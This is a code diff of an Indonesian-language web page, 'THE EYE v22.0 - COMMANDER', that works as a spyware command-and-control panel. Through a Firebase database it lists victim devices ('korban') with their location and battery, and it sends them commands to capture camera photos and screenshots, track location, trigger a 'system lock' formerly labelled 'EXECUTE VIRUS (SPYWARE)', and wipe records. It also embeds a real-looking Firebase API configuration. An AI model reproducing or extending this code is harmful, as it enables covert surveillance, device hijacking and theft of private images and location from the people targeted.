@@ -2,34 +2,52 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>THE EYE v20.0 - SUPREME COMMANDER</title>
+    <title>THE EYE v22.0 - COMMANDER</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; }
-        .sidebar { width: 300px; background: #111; height: 100vh; border-right: 2px solid #00ff00; padding: 20px; overflow-y: auto; }
-        .main-view { flex-grow: 1; padding: 20px; overflow-y: auto; background: #050505; }
-        .card { background: #1a1a1a; border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
-        button { background: #00ff00; color: black; border: none; padding: 10px; font-weight: bold; cursor: pointer; margin: 5px 0; width: 100%; }
-        .btn-virus { background: #ff0000; color: white; }
-        .img-box img { width: 100%; border: 1px solid #00ff00; margin-top: 10px; }
-        h3 { border-bottom: 1px solid #00ff00; padding-bottom: 5px; }
+        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        .sidebar { width: 320px; background: #0f0f0f; border-right: 2px solid #00ff00; padding: 20px; overflow-y: auto; }
+        .main-view { flex-grow: 1; padding: 30px; overflow-y: auto; background: black; }
+        .card { background: #111; border: 1px solid #00ff00; padding: 20px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
+        .target-btn { width: 100%; background: #1a1a1a; color: #00ff00; border: 1px solid #333; padding: 15px; margin-bottom: 10px; text-align: left; cursor: pointer; border-radius: 5px; }
+        .target-btn:hover { background: #00ff00; color: black; }
+        button { border: none; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; margin: 8px 0; text-transform: uppercase; font-family: inherit; }
+        .btn-green { background: #00ff00; color: black; }
+        .btn-shot { background: #00ccff; color: black; }
+        .btn-red { background: #ff0000; color: white; }
+        .btn-white { background: white; color: black; }
+        .btn-del { background: #444; color: white; margin-top: 20px; }
+        .display-area img { width: 100%; border: 2px solid #00ff00; margin-top: 15px; border-radius: 10px; }
+        hr { border: 0; border-top: 1px dashed #00ff00; margin: 15px 0; }
     </style>
 </head>
 <body onload="initApp()">
 
 <div class="sidebar">
-    <h3>🛰️ TARGET LIST</h3>
-    <div id="target-list">Menunggu mangsa...</div>
+    <h3 style="text-align:center">🛰️ ACTIVE NODES</h3>
+    <hr>
+    <div id="target-list">Scanning...</div>
 </div>
 
 <div class="main-view" id="monitor">
-    <h2>📡 MONITORING CENTER v20.0</h2>
-    <p>Pilih target dari sidebar untuk melihat detail.</p>
+    <div style="text-align:center; margin-top: 20%;">
+        <h1>📡 THE EYE v22.0</h1>
+        <p>SELECT A NODE FROM THE RADAR TO EXECUTE COMMANDS</p>
+    </div>
 </div>
 
 <script>
-    const firebaseConfig = { /* TEMPEL CONFIG LU DISINI */ };
+    const firebaseConfig = {
+      apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
+      authDomain: "theeyes-8d0aa.firebaseapp.com",
+      databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "theeyes-8d0aa",
+      storageBucket: "theeyes-8d0aa.firebasestorage.app",
+      messagingSenderId: "886775568743",
+      appId: "1:886775568743:web:89a5a2b26628711fedf7c2"
+    };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
@@ -38,30 +56,40 @@
             const data = snap.val();
             let h = "";
             for(let id in data) {
-                h += `<button onclick="viewTarget('${id}')">📍 ${data[id].waktu}</button>`;
+                h += `<button class="target-btn" onclick="viewTarget('${id}')">📍 NODE_${id.substring(1,7)}<br><small>${data[id].waktu}</small></button>`;
             }
-            document.getElementById('target-list').innerHTML = h;
+            document.getElementById('target-list').innerHTML = h || "Waiting for Connection...";
         });
     }
 
     function viewTarget(id) {
-        db.ref('korban/' + id).once('value', snap => {
+        db.ref('korban/' + id).on('value', snap => {
             const k = snap.val();
-            let html = `
+            if(!k) { document.getElementById('monitor').innerHTML = "<h1>Node Terminated.</h1>"; return; }
+            document.getElementById('monitor').innerHTML = `
                 <div class="card">
-                    <h3>INFO TARGET: ${id}</h3>
-                    <p>🕒 Waktu: ${k.waktu} | 🔋 Bat: ${k.baterai}</p>
-                    <p>🌍 Maps: <a href="${k.maps}" target="_blank" style="color:cyan">BUKA KOORDINAT</a></p>
-                    <button onclick="sendCmd('${id}', 'TAKE')">📸 REQUEST FOTO SEKARANG</button>
-                    <button class="btn-virus" onclick="sendCmd('${id}', 'VIRUS')">☣️ EXECUTE VIRUS (SPYWARE)</button>
-                    <div id="photo-area-${id}" class="img-box">Memuat foto...</div>
+                    <h3>🎮 OVERRIDE CONTROL: ${id}</h3>
+                    <p>🕒 SYNC: ${k.waktu} | 🔋 BAT: ${k.baterai}</p>
+                    <hr>
+                    <button class="btn-green" onclick="sendCmd('${id}', 'TAKE')">📸 REQUEST PHOTO (CAMERA)</button>
+                    <button class="btn-shot" onclick="sendCmd('${id}', 'SHOT')">🖼️ REQUEST SCREENSHOT (WEB)</button>
+                    <button class="btn-green" onclick="window.open('${k.maps}', '_blank')">🌍 TRACK LOCATION</button>
+                    <button class="btn-red" onclick="sendCmd('${id}', 'VIRUS')">☣️ EXECUTE SYSTEM LOCK</button>
+                    <button class="btn-white" onclick="sendCmd('${id}', 'RELEASE')">🏳️ RELEASE TARGET</button>
+                    <button class="btn-del" onclick="killTarget('${id}')">🗑️ WIPE NODE FROM RADAR</button>
+                    <hr>
+                    <div id="feed-${id}" class="display-area">Waiting for incoming data...</div>
                 </div>`;
-            document.getElementById('monitor').innerHTML = html;
             
-            // Listen Foto
-            db.ref('hasil_foto/' + id).on('value', fsnap => {
-                const f = fsnap.val();
-                if(f) document.getElementById(`photo-area-${id}`).innerHTML = `<img src="${f.foto}">`;
+            // Listen Foto Kamera
+            db.ref('hasil_foto/' + id).on('value', fs => {
+                const f = fs.val();
+                if(f) document.getElementById(`feed-${id}`).innerHTML = `<h4>LATEST PHOTO:</h4><img src="${f.foto}">`;
+            });
+            // Listen Screenshot
+            db.ref('hasil_screenshot/' + id).on('value', ss => {
+                const s = ss.val();
+                if(s) document.getElementById(`feed-${id}`).innerHTML += `<h4>LATEST SCREENSHOT:</h4><img src="${s.foto}" style="border-color:cyan">`;
             });
         });
     }
@@ -69,6 +97,15 @@
     function sendCmd(id, action) {
         db.ref('commands/' + id).set({ action: action, t: Date.now() });
         alert("Command " + action + " Sent!");
+    }
+
+    function killTarget(id) {
+        if(confirm("Terminate this node permanently?")) {
+            db.ref('korban/' + id).remove();
+            db.ref('hasil_foto/' + id).remove();
+            db.ref('hasil_screenshot/' + id).remove();
+            db.ref('commands/' + id).remove();
+        }
     }
 </script>
 </body>
